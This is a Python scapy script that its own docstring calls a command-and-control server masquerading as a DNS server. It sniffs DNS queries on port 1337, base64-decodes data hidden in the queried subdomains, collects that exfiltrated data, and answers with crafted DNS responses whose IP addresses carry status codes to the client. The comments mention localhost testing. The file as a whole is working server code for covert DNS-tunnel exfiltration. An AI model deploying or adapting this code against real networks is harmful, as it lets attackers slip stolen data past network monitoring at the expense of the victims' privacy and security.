import socket
from base64 import b64decode
from time import sleep

from scapy.all import *
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

"""
C2 server masquerading as a DNS server. Accepts DNS requests from client program, 
extracts exfiltrated data and returns DNS responses.
"""


def sendResponse(query, ip):
    question = query[DNS].qd
    # Construct response to received question/query
    answer = DNSRR(rrname=question.qname, ttl=1000, rdata=ip)
    response = (
        # Ethernet layer is only required if testing over localhost
        # Can be omitted otherwise
        # Swap source and destination addresses to craft response packet
        Ether(src=query[Ether].dst, dst=query[Ether].src)
        / IP(src=query[IP].dst, dst=query[IP].src)
        / UDP(dport=query[UDP].sport, sport=1337)
        / DNS(id=query[DNS].id, qr=1, qdcount=1, ancount=1, qd=query[DNS].qd, an=answer)
    )
    # Ensures response is sent after request - only needed for testing on localhost
    sleep(1)
    # send() can be used if not testing on localhost
    sendp(response)


extracted = ""


def extractData(x):
    """
    Separate the data (subdomain) from the queried domain. Calculate the B64 padding, add it to the data
    and B64 decode it. Send a DNS response in which the last digit of the returned IP address
    encodes a response code to the client.s
    """
    global extracted
    if x.haslayer(DNS) and x[UDP].dport == 1337:
        domain = x[DNS].qd.qname
        ind = domain.index(bytes(".", "utf-8"))
        data = domain[:ind]
        padnum = (4 - (len(data) % 4)) % 4
        data += bytes("=" * padnum, "utf-8")
        try:
            decoded = b64decode(data).decode("utf-8")
            if decoded == "R":
                response = sendResponse(x, "10.0.0.2")
                print("End transmission")
                print(extracted)
                extracted = ""
            else:
                extracted += decoded
                response = sendResponse(x, "10.0.0.1")
        except Exception as e:
            print(e)
            response = sendResponse(x, "10.0.0.0")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("", 1337))
# s.listen(10)

sniff(prn=extractData)
